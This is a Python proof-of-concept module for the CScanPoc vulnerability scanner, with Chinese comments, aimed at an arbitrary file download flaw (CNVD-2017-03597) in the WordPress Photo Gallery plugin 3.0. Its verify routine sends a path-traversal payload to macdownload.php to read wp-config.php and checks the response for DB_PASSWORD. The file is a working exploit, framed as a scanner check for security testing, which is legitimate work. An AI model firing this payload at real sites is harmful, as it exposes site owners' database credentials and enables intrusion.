# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2017-03597' # 平台漏洞编号
    name = 'Wordpress Photo Gallery插件任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2018-'  # 漏洞公布时间
    desc = '''
    Wordpress Photo Gallery插件存在任意文件下载漏洞，允许攻击者利用漏洞下载任意文件。
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-03597' #
    cnvd_id = 'CNVD-2017-03597' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress Photo Gallery Plugin 3.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd84b5619-b056-4134-9748-52a3afd947c6' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/macdownload.php?albid=../../../wp-config.php"
            
            vul_url = arg + payload
            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
            }
            response = requests.get(vul_url)
            self.output.info("正在尝试读取敏感文件信息")
            if response.status_code ==200 and 'DB_PASSWORD' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()